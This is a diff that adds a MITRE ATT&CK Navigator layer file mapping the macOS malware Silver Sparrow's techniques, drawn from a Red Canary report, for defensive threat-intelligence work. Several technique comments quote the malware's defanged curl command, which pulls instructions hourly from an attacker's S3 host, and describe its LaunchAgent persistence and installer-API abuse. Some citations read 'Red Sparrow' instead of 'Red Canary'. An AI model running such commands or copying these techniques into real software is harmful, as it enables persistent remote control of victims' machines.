@@ -1,0 +1,577 @@
+{
+	"name": "Project Silver Sparrow",
+	"versions": {
+		"attack": "8",
+		"navigator": "4.2",
+		"layer": "4.1"
+	},
+	"domain": "enterprise-attack",
+	"description": "",
+	"filters": {
+		"platforms": [
+			"macOS",
+			"SaaS",
+			"PRE",
+			"Network",
+			"AWS"
+		]
+	},
+	"sorting": 0,
+	"layout": {
+		"layout": "side",
+		"showID": false,
+		"showName": true
+	},
+	"hideDisabled": false,
+	"techniques": [
+		{
+			"techniqueID": "T1134",
+			"tactic": "defense-evasion",
+			"color": "",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": true
+		},
+		{
+			"techniqueID": "T1134",
+			"tactic": "privilege-escalation",
+			"color": "",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": true
+		},
+		{
+			"techniqueID": "T1583",
+			"tactic": "resource-development",
+			"color": "",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": true
+		},
+		{
+			"techniqueID": "T1583.002",
+			"tactic": "resource-development",
+			"score": 1,
+			"color": "",
+			"comment": "[Silver Sparrow]\nCallback domains for this activity cluster leveraged domains hosted through Akamai CDN. this hosting choice allows them to blend in with the normal overhead of cloud infrastructure traffic.\nCitation: Red Canary 2/18/2021",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": false
+		},
+		{
+			"techniqueID": "T1583.004",
+			"tactic": "resource-development",
+			"score": 1,
+			"color": "",
+			"comment": "[Silver Sparrow]\ninfrastructure hosted on AWS S3 offering a highly available and resilient file distribution method avoiding concerns about network administration and overhead. \nCitation: Red Sparrow 2/18/2021",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": false
+		},
+		{
+			"techniqueID": "T1071",
+			"tactic": "command-and-control",
+			"score": 1,
+			"color": "",
+			"comment": "[Silver Sparrow]\nEvery hour, the persistence LaunchAgent tells launchd to execute a shell script that downloads a JSON file to disk, converts it into a plist, and uses its properties to determine further actions.\ncurl hxxps://specialattributes.s3.amazonaws[.]com/applications/updater/ver.json > /tmp/version.json\nplutil -convert xml1 -r /tmp/version.json -o /tmp/version.plist\nCitation: Red Canary 2/18/2021",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": true
+		},
+		{
+			"techniqueID": "T1071.001",
+			"tactic": "command-and-control",
+			"score": 1,
+			"color": "",
+			"comment": "[Silver Sparrow]\nEvery hour, the persistence LaunchAgent tells launchd to execute a shell script that downloads a JSON file to disk, converts it into a plist, and uses its properties to determine further actions.\ncurl hxxps://specialattributes.s3.amazonaws[.]com/applications/updater/ver.json > /tmp/version.json\nplutil -convert xml1 -r /tmp/version.json -o /tmp/version.plist\nCitation: Red Canary 2/18/2021",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": false
+		},
+		{
+			"techniqueID": "T1071.002",
+			"tactic": "command-and-control",
+			"score": 1,
+			"color": "",
+			"comment": "[Silver Sparrow]\nEvery hour, the persistence LaunchAgent tells launchd to execute a shell script that downloads a JSON file to disk, converts it into a plist, and uses its properties to determine further actions.\ncurl hxxps://specialattributes.s3.amazonaws[.]com/applications/updater/ver.json > /tmp/version.json\nplutil -convert xml1 -r /tmp/version.json -o /tmp/version.plist\nCitation: Red Canary 2/18/2021",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": false
+		},
+		{
+			"techniqueID": "T1547",
+			"tactic": "persistence",
+			"color": "",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": true
+		},
+		{
+			"techniqueID": "T1547",
+			"tactic": "privilege-escalation",
+			"color": "",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": true
+		},
+		{
+			"techniqueID": "T1547.011",
+			"tactic": "persistence",
+			"score": 1,
+			"color": "",
+			"comment": "[Silver Sparrow]\nverx.sh script executes periodically because of a persistent LaunchAgent to contact a remote host for more information through PlistBuddy.\nCitation: Red Canary 2/18/2021",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": false
+		},
+		{
+			"techniqueID": "T1547.011",
+			"tactic": "privilege-escalation",
+			"score": 1,
+			"color": "",
+			"comment": "[Silver Sparrow]\nverx.sh script executes periodically because of a persistent LaunchAgent to contact a remote host for more information through PlistBuddy.\nCitation: Red Canary 2/18/2021",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": false
+		},
+		{
+			"techniqueID": "T1059",
+			"tactic": "execution",
+			"color": "",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": true
+		},
+		{
+			"techniqueID": "T1059.007",
+			"tactic": "execution",
+			"score": 1,
+			"color": "",
+			"comment": "[Silver Sparrow]\nInstaller packages leverage the macOS Installer JavaScript API to execute suspicious commands. \nCitation: Red Canary 2/18/2021",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": false
+		},
+		{
+			"techniqueID": "T1543",
+			"tactic": "persistence",
+			"color": "",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": true
+		},
+		{
+			"techniqueID": "T1543",
+			"tactic": "privilege-escalation",
+			"color": "",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": true
+		},
+		{
+			"techniqueID": "T1543.001",
+			"tactic": "persistence",
+			"score": 1,
+			"color": "",
+			"comment": "[Silver Sparrow]\nverx.sh script executes periodically because of a persistent LaunchAgent to contact a remote host for more information through PlistBuddy.\nCitation: Red Canary 2/18/2021",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": false
+		},
+		{
+			"techniqueID": "T1543.001",
+			"tactic": "privilege-escalation",
+			"score": 1,
+			"color": "",
+			"comment": "[Silver Sparrow]\nverx.sh script executes periodically because of a persistent LaunchAgent to contact a remote host for more information through PlistBuddy.\nCitation: Red Canary 2/18/2021",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": false
+		},
+		{
+			"techniqueID": "T1114",
+			"tactic": "collection",
+			"color": "",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": true
+		},
+		{
+			"techniqueID": "T1546",
+			"tactic": "privilege-escalation",
+			"color": "",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": true
+		},
+		{
+			"techniqueID": "T1546",
+			"tactic": "persistence",
+			"color": "",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": true
+		},
+		{
+			"techniqueID": "T1546.004",
+			"tactic": "privilege-escalation",
+			"score": 1,
+			"color": "",
+			"comment": "[Silver Sparrow]\nThe installer used three JavaScript functions for all the heavy lifting inside the “installation_check()” function which contains 3 bash commands.\nCitation: Red Canary 2/18/2021",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": false
+		},
+		{
+			"techniqueID": "T1546.004",
+			"tactic": "persistence",
+			"score": 1,
+			"color": "",
+			"comment": "[Silver Sparrow]\nThe installer used three JavaScript functions for all the heavy lifting inside the “installation_check()” function which contains 3 bash commands.\nCitation: Red Canary 2/18/2021",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": false
+		},
+		{
+			"techniqueID": "T1070",
+			"tactic": "defense-evasion",
+			"color": "",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": true
+		},
+		{
+			"techniqueID": "T1070.004",
+			"tactic": "defense-evasion",
+			"score": 0.67,
+			"color": "",
+			"comment": "[Silver Sparrow]\nSilver Sparrow includes a file check that causes the removal of all persistence mechanisms and scripts. It checks for the presence of ~/Library/._insu on disk, and, if the file is present, Silver Sparrow removes all of its components from the endpoint. Hashes reported from Malwarebytes (d41d8cd98f00b204e9800998ecf8427e) indicated that the ._insu file was empty.\nCitation: Red Canary 2/18/2021",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": false
+		},
+		{
+			"techniqueID": "T1559",
+			"tactic": "execution",
+			"color": "",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": true
+		},
+		{
+			"techniqueID": "T1106",
+			"tactic": "execution",
+			"score": 1,
+			"color": "",
+			"comment": "[Silver Sparrow]\nThe bash code uses Apple’s system.run command for execution. Apple documented the system.run code as launching “a given program in the Resources directory of the installation package,” but it’s not limited to using the Resources directory. As observed with Silver Sparrow, you can provide the full path to a process for execution and its arguments. By taking this route, the malware causes the installer to spawn multiple bash processes that it can then use to accomplish its objectives.\nCitation: Red Canary 2/18/2021",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": false
+		},
+		{
+			"techniqueID": "T1003",
+			"tactic": "credential-access",
+			"color": "",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": true
+		},
+		{
+			"techniqueID": "T1027",
+			"tactic": "defense-evasion",
+			"color": "",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": true
+		},
+		{
+			"techniqueID": "T1027.004",
+			"tactic": "defense-evasion",
+			"score": 1,
+			"color": "",
+			"comment": "[Silver Sparrow]\nDynamically generates the script using JavaScript commands which avoids simple static signatures and eases development. \nCitation: Red Canary 2/18/2021",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": false
+		},
+		{
+			"techniqueID": "T1137",
+			"tactic": "persistence",
+			"color": "",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": true
+		},
+		{
+			"techniqueID": "T1055",
+			"tactic": "defense-evasion",
+			"color": "",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": true
+		},
+		{
+			"techniqueID": "T1055",
+			"tactic": "privilege-escalation",
+			"color": "",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": true
+		},
+		{
+			"techniqueID": "T1218",
+			"tactic": "defense-evasion",
+			"color": "",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": true
+		},
+		{
+			"techniqueID": "T1216",
+			"tactic": "defense-evasion",
+			"color": "",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": true
+		},
+		{
+			"techniqueID": "T1558",
+			"tactic": "credential-access",
+			"color": "",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": true
+		},
+		{
+			"techniqueID": "T1049",
+			"tactic": "discovery",
+			"score": 1,
+			"color": "",
+			"comment": "[Silver Sparrow]\nRetrieves the system UUID for reporting and by executing a sqlite3 query, the malware finds the original URL the PKG downloaded from, giving the adversary an idea of successful distribution channels.\nCitation: Red Canary 2/18/2021",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": false
+		},
+		{
+			"techniqueID": "T1033",
+			"tactic": "discovery",
+			"score": 1,
+			"color": "",
+			"comment": "[Silver Sparrow]\nRetrieves the system UUID for reporting \nCitation: Red Canary 2/18/2021",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": false
+		},
+		{
+			"techniqueID": "T1569",
+			"tactic": "execution",
+			"color": "",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": true
+		},
+		{
+			"techniqueID": "T1127",
+			"tactic": "defense-evasion",
+			"color": "",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": true
+		},
+		{
+			"techniqueID": "T1204",
+			"tactic": "execution",
+			"color": "",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": true
+		},
+		{
+			"techniqueID": "T1204.002",
+			"tactic": "execution",
+			"score": 1,
+			"color": "",
+			"comment": "[Silver Sparrow]\nMalware distributed in two distinct packages: updater.pkg and update.pkg. Both versions use the same techniques to execute, differing only in the compilation of the bystander binary.\nCitation: Red Canary 2/18/2021",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": false
+		},
+		{
+			"techniqueID": "T1078",
+			"tactic": "defense-evasion",
+			"color": "",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": true
+		},
+		{
+			"techniqueID": "T1078",
+			"tactic": "persistence",
+			"color": "",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": true
+		},
+		{
+			"techniqueID": "T1078",
+			"tactic": "privilege-escalation",
+			"color": "",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": true
+		},
+		{
+			"techniqueID": "T1078",
+			"tactic": "initial-access",
+			"color": "",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": true
+		},
+		{
+			"techniqueID": "T1078.002",
+			"tactic": "defense-evasion",
+			"score": 1,
+			"color": "",
+			"comment": "[Silver Sparrow]\nCallback domains for this activity cluster leveraged domains hosted through Akamai CDN. this hosting choice allows them to blend in with the normal overhead of cloud infrastructure traffic.\nCitation: Red Canary 2/18/2021",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": false
+		},
+		{
+			"techniqueID": "T1078.002",
+			"tactic": "persistence",
+			"score": 1,
+			"color": "",
+			"comment": "[Silver Sparrow]\nCallback domains for this activity cluster leveraged domains hosted through Akamai CDN. this hosting choice allows them to blend in with the normal overhead of cloud infrastructure traffic.\nCitation: Red Canary 2/18/2021",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": false
+		},
+		{
+			"techniqueID": "T1078.002",
+			"tactic": "privilege-escalation",
+			"score": 1,
+			"color": "",
+			"comment": "[Silver Sparrow]\nCallback domains for this activity cluster leveraged domains hosted through Akamai CDN. this hosting choice allows them to blend in with the normal overhead of cloud infrastructure traffic.\nCitation: Red Canary 2/18/2021",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": false
+		},
+		{
+			"techniqueID": "T1078.002",
+			"tactic": "initial-access",
+			"score": 1,
+			"color": "",
+			"comment": "[Silver Sparrow]\nCallback domains for this activity cluster leveraged domains hosted through Akamai CDN. this hosting choice allows them to blend in with the normal overhead of cloud infrastructure traffic.\nCitation: Red Canary 2/18/2021",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": false
+		},
+		{
+			"techniqueID": "T1078.004",
+			"tactic": "defense-evasion",
+			"score": 1,
+			"color": "",
+			"comment": "[Silver Sparrow]\ninfrastructure hosted on AWS S3 offering a highly available and resilient file distribution method avoiding concerns about network administration and overhead. \nCitation: Red Sparrow 2/18/2021",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": false
+		},
+		{
+			"techniqueID": "T1078.004",
+			"tactic": "persistence",
+			"score": 1,
+			"color": "",
+			"comment": "[Silver Sparrow]\ninfrastructure hosted on AWS S3 offering a highly available and resilient file distribution method avoiding concerns about network administration and overhead. \nCitation: Red Sparrow 2/18/2021",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": false
+		},
+		{
+			"techniqueID": "T1078.004",
+			"tactic": "privilege-escalation",
+			"score": 1,
+			"color": "",
+			"comment": "[Silver Sparrow]\ninfrastructure hosted on AWS S3 offering a highly available and resilient file distribution method avoiding concerns about network administration and overhead. \nCitation: Red Sparrow 2/18/2021",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": false
+		},
+		{
+			"techniqueID": "T1078.004",
+			"tactic": "initial-access",
+			"score": 1,
+			"color": "",
+			"comment": "[Silver Sparrow]\ninfrastructure hosted on AWS S3 offering a highly available and resilient file distribution method avoiding concerns about network administration and overhead. \nCitation: Red Sparrow 2/18/2021",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": false
+		},
+		{
+			"techniqueID": "T1484",
+			"tactic": "defense-evasion",
+			"color": "",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": true
+		},
+		{
+			"techniqueID": "T1484",
+			"tactic": "privilege-escalation",
+			"color": "",
+			"comment": "",
+			"enabled": true,
+			"metadata": [],
+			"showSubtechniques": true
+		}
+	],
+	"gradient": {
+		"colors": [
+			"#ffffff",
+			"#8ec843"
+		],
+		"minValue": 0,
+		"maxValue": 1
+	},
+	"legendItems": [
+		{
+			"label": "Silver Sparrow",
+			"color": "#8ec843"
+		}
+	],
+	"metadata": [],
+	"showTacticRowBackground": false,
+	"tacticRowBackground": "#dddddd",
+	"selectTechniquesAcrossTactics": true,
+	"selectSubtechniquesWithParent": false
+}
